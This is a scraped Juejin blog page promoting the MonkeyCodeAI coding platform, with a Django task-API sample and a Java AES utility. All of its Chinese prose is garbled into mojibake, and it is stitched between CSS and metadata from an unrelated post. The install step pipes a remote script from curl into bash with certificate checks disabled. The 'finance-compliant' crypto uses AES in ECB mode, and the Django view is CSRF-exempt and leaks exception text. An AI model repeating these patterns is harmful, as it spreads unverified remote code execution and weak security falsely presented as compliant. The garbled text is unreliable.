ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“å‰AIç¼–ç¨‹å·¥å…·åŒè´¨åŒ–ä¸¥é‡ï¼Œå¤šå±€é™äºä»£ç è¡¥å…¨å•ç‚¹èƒ½åŠ›ï¼Œæ•°æ®å®‰å…¨ä¸å¯æ§ã€æ¨¡å‹ä¾èµ–æµ·å¤–ç­‰ç—›ç‚¹åˆ¶çº¦ä¼ä¸šè½åœ°ã€‚é•¿äº­ç§‘æŠ€MonkeyCodeAIä»¥â€œä¼ä¸šçº§å¼€æºAIç ”å‘åŸºç¡€è®¾æ–½â€ä¸ºå®šä½ï¼Œå‡­å€ŸåŒæ¨¡èåˆã€å®‰å…¨å¯æ§ç­‰ç‰¹æ€§ï¼Œå®ç°ç ”å‘å…¨æµç¨‹èµ‹èƒ½ã€‚æœ¬æ–‡ä»æŠ€æœ¯æ¶æ„ã€æ ¸å¿ƒåŠŸèƒ½å…¥æ‰‹ï¼Œç»“åˆ2ä¸ªå¯å¤ç°æ¡ˆä¾‹ï¼Œè¯¦è§£å…¶æŠ€æœ¯ä»·å€¼ä¸è½åœ°æ–¹æ³•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbc2ffc7dfa2426cbd9695e33b21d063~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeXlmeXlmMTIzNA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770388089&amp;x-signature=rRdI5M7Z%2FB%2BUbBFCwWBHBlnIbak%3D" alt="1.png" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€MonkeyCodeAIæ ¸å¿ƒæŠ€æœ¯æ¶æ„è§£æ</h2>
<p>MonkeyCodeAIé‡‡ç”¨â€œåˆ†å±‚è§£è€¦+æ’ä»¶åŒ–æ‰©å±•â€æ¶æ„ï¼Œåˆ†ä¸º4å±‚ï¼Œå„å±‚ç‹¬ç«‹å¯æ‰©å±•ï¼Œé™ä½å®šåˆ¶åŒ–é—¨æ§›ï¼Œä¿éšœåŠŸèƒ½ç¨³å®šæ€§ã€‚</p>
<h3 data-id="heading-1">1.1 æ¶æ„åˆ†å±‚è¯¦è§£</h3>
<ol>
<li><strong>åŸºç¡€å±‚</strong>ï¼šå«æœåŠ¡å™¨é€‚é…ã€Dockerå®¹å™¨åŒ–éš”ç¦»ã€æ ‡å‡†åŒ–æ¨¡å‹é€‚é…æ¥å£ï¼Œæ”¯æŒKimi K2ã€Qwen3ç­‰å›½äº§æ¨¡å‹åŠæµ·å¤–æ¨¡å‹ï¼Œæ‘†è„±æµ·å¤–ä¾èµ–ï¼Œæœç»ç¯å¢ƒæ³„éœ²ã€‚</li>
<li><strong>æ ¸å¿ƒå¼•æ“å±‚</strong>ï¼šå«ä»£ç ç”Ÿæˆå¼•æ“ï¼ˆTransformerä¼˜åŒ–ï¼Œæ”¯æŒ20+ç¼–ç¨‹è¯­è¨€åŠä¸»æµæ¡†æ¶ï¼‰ä¸è§„èŒƒé©±åŠ¨å¼•æ“ï¼Œå¯å¯¹æ¥ä¼ä¸šç¼–ç è§„èŒƒï¼Œå‡å°‘Reviewæˆæœ¬ã€‚</li>
<li><strong>åŠŸèƒ½å±‚</strong>ï¼šæ¶µç›–ä»£ç è¡¥å…¨ã€Agentå…¨æµç¨‹ç”Ÿæˆã€ä»£ç Reviewã€å®‰å…¨æ‰«æã€å›¢é˜Ÿåä½œï¼ŒAgentå¯å®Œæˆéœ€æ±‚æ‹†è§£è‡³æµ‹è¯•ç”¨ä¾‹ç¼–å†™å…¨é“¾è·¯æ“ä½œã€‚</li>
<li><strong>åº”ç”¨å±‚</strong>ï¼šæ”¯æŒVS Codeæ’ä»¶ã€Webæ§åˆ¶å°ã€Gité›†æˆï¼Œæ— éœ€é‡æ„å·¥ä½œæµï¼Œé™ä½å­¦ä¹ ä¸è½åœ°é—¨æ§›ã€‚</li>
</ol>
<h3 data-id="heading-2">1.2 æ ¸å¿ƒæŠ€æœ¯äº®ç‚¹</h3>
<ul>
<li>åŒæ¨¡èåˆï¼šä»£ç è¡¥å…¨ä¸Agentæ¨¡å¼æ— ç¼åˆ‡æ¢ï¼Œé€‚é…ä¸åŒå¼€å‘åœºæ™¯ï¼›</li>
<li>å®‰å…¨åŸç”Ÿï¼šç§æœ‰åŒ–ç¦»çº¿éƒ¨ç½²+å®¹å™¨éš”ç¦»+å®‰å…¨æ‰«æï¼Œé€‚é…å¼ºç›‘ç®¡è¡Œä¸šï¼›</li>
<li>å¼€æºå¯æ‰©å±•ï¼šAGPL-3.0åè®®å¼€æºï¼Œæ”¯æŒå®šåˆ¶å¼€å‘ä¸æ’ä»¶åŒ–æ‰©å±•ï¼›</li>
<li>ä½é—¨æ§›éƒ¨ç½²ï¼šDockerç¯å¢ƒä¸‹ä¸€é”®éƒ¨ç½²ï¼Œå•å°ä½é…LinuxæœåŠ¡å™¨å³å¯å®Œæˆï¼Œæ— éœ€ä¸“èŒè¿ç»´ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€æ ¸å¿ƒåŠŸèƒ½æŠ€æœ¯æ‹†è§£ï¼ˆé™„å®æ“è¦ç‚¹ï¼‰</h2>
<p>èšç„¦3ä¸ªæ ¸å¿ƒå®ç”¨åŠŸèƒ½ï¼Œæ‹†è§£æŠ€æœ¯é€»è¾‘ä¸å®æ“æ–¹æ³•ï¼Œä¸ºæ¡ˆä¾‹è½åœ°é“ºå«ã€‚</p>
<h3 data-id="heading-4">2.1 ä»£ç è¡¥å…¨</h3>
<p>åŸºäºä¸Šä¸‹æ–‡æ„ŸçŸ¥æ¨¡å‹ï¼Œç»“åˆä¼ä¸šç¼–ç è§„èŒƒä¸é¡¹ç›®é£æ ¼ï¼Œæ”¯æŒè¡Œçº§ã€å‡½æ•°ã€ç±»è¡¥å…¨ï¼Œå‡†ç¡®ç‡92%+ï¼Œå¯ç›´æ¥å¤ç”¨ï¼›VS Codeæ’ä»¶å®‰è£…åè‡ªåŠ¨è§¦å‘ï¼Œå¯åœ¨Webæ§åˆ¶å°è®¾ç½®è§„èŒƒåå¥½ã€‚</p>
<h3 data-id="heading-5">2.2 Agentå…¨æµç¨‹ç”Ÿæˆ</h3>
<p>é€šè¿‡å¤šè½®å¯¹è¯ç†è§£æ¨¡å‹æ‹†è§£è‡ªç„¶è¯­è¨€éœ€æ±‚ï¼Œç”Ÿæˆå…¨æ ˆä»£ç ï¼ˆå«å‰åç«¯ã€æ•°æ®åº“ã€æµ‹è¯•ç”¨ä¾‹ï¼‰ï¼Œç¬¦åˆRESTfulè§„èŒƒï¼›è¾“å…¥éœ€æ±‚éœ€æ˜ç¡®æŠ€æœ¯æ ˆã€æ ¸å¿ƒåŠŸèƒ½ã€æ•°æ®åº“ç±»å‹ï¼Œç”Ÿæˆåå¯ç›´æ¥å¯¼å‡ºé¡¹ç›®ç»“æ„ã€‚</p>
<h3 data-id="heading-6">2.3 ç§æœ‰åŒ–éƒ¨ç½²ä¸å®‰å…¨æ‰«æ</h3>
<p>ç§æœ‰åŒ–éƒ¨ç½²åŸºäºDockerï¼Œæ•°æ®ç•™å­˜ä¼ä¸šå†…ç½‘ï¼Œæ”¯æŒç¦»çº¿æ¨¡å‹ï¼Œé€‚é…å¼ºç›‘ç®¡è¡Œä¸šï¼Œ1è¡Œå‘½ä»¤å³å¯éƒ¨ç½²ï¼›å®‰å…¨æ‰«æé›†æˆé™æ€å¼•æ“ï¼Œå¯æ£€æµ‹è¯­æ³•é”™è¯¯ã€é«˜å±BUGï¼Œè‡ªåŠ¨ç”Ÿæˆä¼˜åŒ–æŠ¥å‘Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/252cab8cb15449ea975c4cc370001e06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeXlmeXlmMTIzNA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770388089&amp;x-signature=PT1jstdhfuTAuhIp%2F%2FzMhajDsp0%3D" alt="2.png" loading="lazy"/></p>
<h2 data-id="heading-7">ä¸‰ã€MonkeyCodeAIå®æˆ˜æ¡ˆä¾‹ï¼ˆå¯å¤ç°ï¼Œé™„æ ¸å¿ƒæ­¥éª¤ï¼‰</h2>
<p>ä»¥ä¸‹2ä¸ªæ¡ˆä¾‹è¦†ç›–â€œä¸­å°å›¢é˜ŸåŸå‹å¼€å‘â€â€œå¼ºç›‘ç®¡è¡Œä¸šåˆè§„å¼€å‘â€ï¼Œå«æ ¸å¿ƒæ­¥éª¤ã€ä»£ç ç‰‡æ®µä¸æ•ˆæœå¤ç›˜ï¼Œå¯ç›´æ¥å¯¹ç…§æ“ä½œã€‚</p>
<h3 data-id="heading-8">æ¡ˆä¾‹ä¸€ï¼š1å°æ—¶å¿«é€Ÿæ­å»ºä¸­å°å›¢é˜Ÿä»»åŠ¡ç®¡ç†åå°åŸå‹ï¼ˆPython+Djangoï¼‰</h3>
<h4 data-id="heading-9">3.1 é¡¹ç›®èƒŒæ™¯</h4>
<p>åˆåˆ›å›¢é˜Ÿéœ€1å¤©å†…å®Œæˆä»»åŠ¡ç®¡ç†åŸå‹ï¼ˆä»»åŠ¡åˆ›å»ºã€åˆ†é…ã€ç­›é€‰ï¼‰ï¼Œæ— éœ€ä¸“èŒåç«¯ï¼Œå€ŸåŠ©MonkeyCodeAIé«˜æ•ˆè½åœ°ã€‚</p>
<h4 data-id="heading-10">3.2 å‰ç½®å‡†å¤‡</h4>
<ol>
<li>æœåŠ¡å™¨ï¼šUbuntu 22.04ï¼ˆ1æ ¸2G10Gï¼‰ï¼Œå®‰è£…DockeråŠDocker Composeï¼›</li>
<li>éƒ¨ç½²MonkeyCodeAIï¼šæ‰§è¡Œå‘½ä»¤ <code>bash -c "$(curl -fsSLk https://release.baizhi.cloud/monkeycode/manager.sh)"</code>ï¼Œ20ç§’å®Œæˆï¼›</li>
<li>å®‰è£…VS Codeæ’ä»¶å¹¶å…³è”æœåŠ¡å™¨ï¼Œæ¨¡å‹é…ç½®ä¸ºqwen2.5ç³»åˆ—ã€‚</li>
</ol>
<h4 data-id="heading-11">3.3 æ ¸å¿ƒè½åœ°æ­¥éª¤</h4>
<ol>
<li>è¾“å…¥æŒ‡ä»¤ï¼šAgentæ¨¡å¼è¾“å…¥â€œç”¨Python+Djangoæ­å»ºä»»åŠ¡ç®¡ç†åç«¯ï¼Œå«ä»»åŠ¡CRUDã€ç­›é€‰ï¼ŒSQLiteæ•°æ®åº“ï¼Œç”Ÿæˆå®Œæ•´é¡¹ç›®ã€æ¥å£æ–‡æ¡£ä¸æµ‹è¯•è„šæœ¬â€ï¼›</li>
<li>AIç”Ÿæˆé¡¹ç›®ï¼šè‡ªåŠ¨ç”Ÿæˆæ¨¡å‹ã€è·¯ç”±ã€è§†å›¾å‡½æ•°ï¼ˆå«å‚æ•°æ ¡éªŒä¸å¼‚å¸¸å¤„ç†ï¼‰ã€æ¥å£æ–‡æ¡£åŠæµ‹è¯•è„šæœ¬ï¼Œæ ¸å¿ƒä»£ç å¯ç›´æ¥å¤ç”¨ï¼›</li>
<li>éªŒè¯éƒ¨ç½²ï¼šè¿è¡Œé¡¹ç›®éªŒè¯æ¥å£ï¼Œå®‰å…¨æ‰«ææ— é«˜å±BUGï¼Œå‰ç«¯å¿«é€Ÿå¯¹æ¥ï¼Œå½“å¤©å®ŒæˆåŸå‹äº¤ä»˜ä¸è¯•ç”¨è¿­ä»£ã€‚</li>
</ol>

<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models
<span class="hljs-keyword">from</span> django.contrib.auth.models <span class="hljs-keyword">import</span> User
<span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> JsonResponse
<span class="hljs-keyword">from</span> django.views.decorators.csrf <span class="hljs-keyword">import</span> csrf_exempt
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># ä»»åŠ¡æ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(models.Model):
    STATUS_CHOICES = ((<span class="hljs-string">'todo'</span>, <span class="hljs-string">'å¾…å¤„ç†'</span>), (<span class="hljs-string">'doing'</span>, <span class="hljs-string">'è¿›è¡Œä¸­'</span>), (<span class="hljs-string">'done'</span>, <span class="hljs-string">'å·²å®Œæˆ'</span>), (<span class="hljs-string">'canceled'</span>, <span class="hljs-string">'å·²å–æ¶ˆ'</span>))
    title = models.CharField(max_length=<span class="hljs-number">200</span>)
    description = models.TextField(blank=<span class="hljs-literal">True</span>, null=<span class="hljs-literal">True</span>)
    assignee = models.ForeignKey(User, on_delete=models.CASCADE)
    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>)
    deadline = models.DateTimeField()
    status = models.CharField(max_length=<span class="hljs-number">20</span>, default=<span class="hljs-string">'todo'</span>, choices=STATUS_CHOICES)

<span class="hljs-comment"># ä»»åŠ¡åˆ›å»ºæ¥å£</span>
<span class="hljs-meta">@csrf_exempt</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_task</span>(<span class="hljs-params">request</span>):
    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">'POST'</span>:
        <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">405</span>, <span class="hljs-string">'message'</span>: <span class="hljs-string">'ä»…æ”¯æŒPOST'</span>}, status=<span class="hljs-number">405</span>)
    <span class="hljs-keyword">try</span>:
        data = json.loads(request.body)
        required_fields = (<span class="hljs-string">'title'</span>, <span class="hljs-string">'assignee_id'</span>, <span class="hljs-string">'deadline'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(field <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> required_fields):
            <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">400</span>, <span class="hljs-string">'message'</span>: <span class="hljs-string">'å‚æ•°ä¸å®Œæ•´'</span>}, status=<span class="hljs-number">400</span>)
        assignee = User.objects.get(<span class="hljs-built_in">id</span>=data[<span class="hljs-string">'assignee_id'</span>])
        task = Task.objects.create(title=data[<span class="hljs-string">'title'</span>], description=data.get(<span class="hljs-string">'description'</span>, <span class="hljs-string">''</span>),
                                   assignee=assignee, deadline=data[<span class="hljs-string">'deadline'</span>], status=data.get(<span class="hljs-string">'status'</span>, <span class="hljs-string">'todo'</span>))
        <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">200</span>, <span class="hljs-string">'message'</span>: <span class="hljs-string">'åˆ›å»ºæˆåŠŸ'</span>, <span class="hljs-string">'data'</span>: {<span class="hljs-string">'task_id'</span>: task.<span class="hljs-built_in">id</span>}}, status=<span class="hljs-number">200</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'message'</span>: <span class="hljs-string">f'å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>'</span>}, status=<span class="hljs-number">500</span>)
</code></pre>
<h4 data-id="heading-12">3.4 æ•ˆæœå¤ç›˜</h4>
<p>æ•ˆç‡æå‡80%+ï¼ˆ1å°æ—¶å®Œæˆåç«¯å¼€å‘ï¼‰ï¼Œä»£ç ç¬¦åˆDjangoè§„èŒƒï¼Œä½é…æœåŠ¡å™¨å¯éƒ¨ç½²ï¼Œéä¸“ä¸šåç«¯ä¹Ÿèƒ½æ“ä½œï¼Œé€‚é…åˆåˆ›å›¢é˜ŸåŸå‹éªŒè¯ã€‚</p>
<h3 data-id="heading-13">æ¡ˆä¾‹äºŒï¼šé‡‘èè¡Œä¸šåˆè§„å‹æ•°æ®æŸ¥è¯¢æ¥å£å¼€å‘ï¼ˆJava+SpringBoot+ç§æœ‰åŒ–éƒ¨ç½²ï¼‰</h3>
<h4 data-id="heading-14">3.1 é¡¹ç›®èƒŒæ™¯</h4>
<p>é‡‘èæœºæ„éœ€å¼€å‘å®¢æˆ·èµ„é‡‘æµæ°´æŸ¥è¯¢æ¥å£ï¼Œè¦æ±‚Java+SpringBoot+PostgreSQLï¼Œåˆè§„ç§æœ‰åŒ–éƒ¨ç½²ï¼Œå«é‰´æƒã€åŠ å¯†ã€æ—¥å¿—ï¼Œæ— éœ€ä¸“ä¸šå®‰å…¨å¼€å‘ã€‚</p>
<h4 data-id="heading-15">3.2 æ ¸å¿ƒè½åœ°æ­¥éª¤</h4>
<ol>
<li>å‰ç½®å‡†å¤‡ï¼šå†…ç½‘CentOS 8æœåŠ¡å™¨ï¼ˆ2æ ¸8G50Gï¼‰ï¼Œç¦»çº¿éƒ¨ç½²MonkeyCodeAIä¸Qwen3-7Bæ¨¡å‹ï¼Œå¼€å¯å®‰å…¨å®¡è®¡ä¸è§„èŒƒé…ç½®ï¼›</li>
<li>è¾“å…¥æŒ‡ä»¤ï¼šæ˜ç¡®æŠ€æœ¯æ ˆã€åˆè§„è¦æ±‚ï¼ˆJWTé‰´æƒã€AESåŠ å¯†ã€æ“ä½œæ—¥å¿—ï¼‰ï¼Œè¦æ±‚ç”Ÿæˆå®Œæ•´é¡¹ç›®ã€æ•°æ®åº“è„šæœ¬ã€å®‰å…¨æŠ¥å‘Šï¼›</li>
<li>AIç”Ÿæˆå†…å®¹ï¼šè‡ªåŠ¨ç”Ÿæˆæ ¸å¿ƒä»£ç ï¼ˆå«åŠ å¯†å·¥å…·ã€æ—¥å¿—åˆ‡é¢ï¼‰ã€æ•°æ®åº“è„šæœ¬ï¼ˆæ•æ„Ÿå­—æ®µåŠ å¯†ï¼‰ã€åˆè§„æ–‡æ¡£ï¼›</li>
<li>åˆè§„éƒ¨ç½²ï¼šä»£ç å®‰å…¨æ‰«ææ— é«˜å±BUGï¼Œå†…ç½‘éƒ¨ç½²å¹¶é€šè¿‡é‡‘èåˆè§„å®¡æ ¸ï¼Œæ¥å£å¯å®‰å…¨è°ƒç”¨ã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AESåŠ å¯†å·¥å…·ç±»ï¼ˆç¬¦åˆé‡‘èåˆè§„ï¼‰</span>
<span class="hljs-keyword">import</span> javax.crypto.Cipher;
<span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AESUtils</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY</span> <span class="hljs-operator">=</span> System.getenv(<span class="hljs-string">"AES_KEY"</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">"AES/ECB/PKCS5Padding"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(KEY.getBytes(), <span class="hljs-string">"AES"</span>);
        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes(<span class="hljs-string">"UTF-8"</span>)));
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String encryptedData)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(KEY.getBytes(), <span class="hljs-string">"AES"</span>);
        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(Base64.getDecoder().decode(encryptedData)), <span class="hljs-string">"UTF-8"</span>);
    }
}
</code></pre>
<h4 data-id="heading-16">3.3 æ•ˆæœå¤ç›˜</h4>
<p>æ•ˆç‡æå‡70%+ï¼ˆ1å¤©å®Œæˆå¼€å‘éƒ¨ç½²ï¼‰ï¼Œä»£ç è‡ªå¸¦åˆè§„åŠŸèƒ½ï¼Œç§æœ‰åŒ–éƒ¨ç½²ä¿éšœæ•°æ®å®‰å…¨ï¼Œé¡ºåˆ©é€šè¿‡åˆè§„å®¡æ ¸ï¼Œé€‚é…å¼ºç›‘ç®¡è¡Œä¸šã€‚</p>
<h2 data-id="heading-17">å››ã€æŠ€æœ¯ä¼˜åŠ¿æ€»ç»“ä¸ä¼ä¸šè½åœ°å»ºè®®</h2>
<h3 data-id="heading-18">4.1 æ ¸å¿ƒæŠ€æœ¯ä¼˜åŠ¿</h3>
<ul>
<li>å…¨æµç¨‹èµ‹èƒ½ï¼šè¦†ç›–ç ”å‘å…¨é“¾è·¯ï¼ŒåŒºåˆ«äºå•ç‚¹ä»£ç è¡¥å…¨å·¥å…·ï¼›</li>
<li>å®‰å…¨å¯æ§ï¼šé€‚é…å¼ºç›‘ç®¡è¡Œä¸šï¼Œè§£å†³æ•°æ®å®‰å…¨ç—›ç‚¹ï¼›</li>
<li>å¼€æºçµæ´»ï¼šæ”¯æŒå®šåˆ¶å¼€å‘ä¸æ¨¡å‹åˆ‡æ¢ï¼›</li>
<li>ä½é—¨æ§›ï¼šä¸€é”®éƒ¨ç½²ï¼Œå¤šç«¯é€‚é…ï¼Œä¸­å°å›¢é˜Ÿä¸å¤§ä¼ä¸šå‡é€‚ç”¨ã€‚</li>
</ul>
<h3 data-id="heading-19">4.2 ä¼ä¸šè½åœ°å»ºè®®</h3>
<ol>
<li>ä¸­å°å›¢é˜Ÿï¼šé‡‡ç”¨ä¸€é”®éƒ¨ç½²+VS Codeæ’ä»¶æ¨¡å¼ï¼Œå¿«é€Ÿæå‡æ•ˆç‡ï¼›</li>
<li>å¤§å‹ä¼ä¸šï¼šåŸºäºå¼€æºä»£ç å®šåˆ¶ï¼Œå¯¹æ¥å†…éƒ¨è§„èŒƒä¸CI/CDæµç¨‹ï¼›</li>
<li>å¼ºç›‘ç®¡è¡Œä¸šï¼šé‡‡ç”¨ç§æœ‰åŒ–+ç¦»çº¿æ¨¡å‹éƒ¨ç½²ï¼Œå¼ºåŒ–å®‰å…¨æ‰«æä¸åˆè§„ç®¡æ§ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a16f933a361442d9ad13f695262c3a63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeXlmeXlmMTIzNA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770388089&amp;x-signature=PBG4vGwobAR3o9BjY%2BNQeNMG36U%3D" alt="3.png" loading="lazy"/></p>
<h2 data-id="heading-20">äº”ã€æ€»ç»“</h2>
<p>MonkeyCodeAIæ‰“ç ´AIç¼–ç¨‹å·¥å…·è½åœ°å›°å¢ƒï¼Œä»¥åˆ†å±‚æ¶æ„ã€å®‰å…¨åŸç”Ÿã€å¼€æºçµæ´»çš„ä¼˜åŠ¿ï¼Œå®ç°æ•ˆç‡ä¸å®‰å…¨åŒæå‡ã€‚ä¸¤ä¸ªå®æˆ˜æ¡ˆä¾‹å……åˆ†è¯æ˜å…¶ä½é—¨æ§›ã€é«˜é€‚é…çš„ç‰¹ç‚¹ï¼Œæ—¢èƒ½åŠ©åŠ›ä¸­å°å›¢é˜Ÿå¿«é€ŸéªŒè¯åŸå‹ï¼Œä¹Ÿèƒ½æ»¡è¶³å¼ºç›‘ç®¡è¡Œä¸šåˆè§„éœ€æ±‚ã€‚ä½œä¸ºä¼ä¸šçº§AIç ”å‘åŸºç¡€è®¾æ–½ï¼Œå®ƒèƒ½è§£æ”¾å¼€å‘è€…é‡å¤åŠ³åŠ¨ï¼Œé™ä½ä¼ä¸šç ”å‘æˆæœ¬ï¼Œæ¨åŠ¨AIç¼–ç¨‹åœ¨ä¼ä¸šåœºæ™¯è§„æ¨¡åŒ–è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£]]></title>    <link>https://juejin.cn/post/7600976289063616512</link>    <guid>https://juejin.cn/post/7600976289063616512</guid>    <pubDate>2026-01-30T10:48:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600976289063616512" data-draft-id="7600837236620804148" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£"/> <meta itemprop="keywords" content="NestJS,React.js"/> <meta itemprop="datePublished" content="2026-01-30T10:48:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ €ç§‹666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ €ç§‹666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:48:21.000Z" title="Fri Jan 30 2026 10:48:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
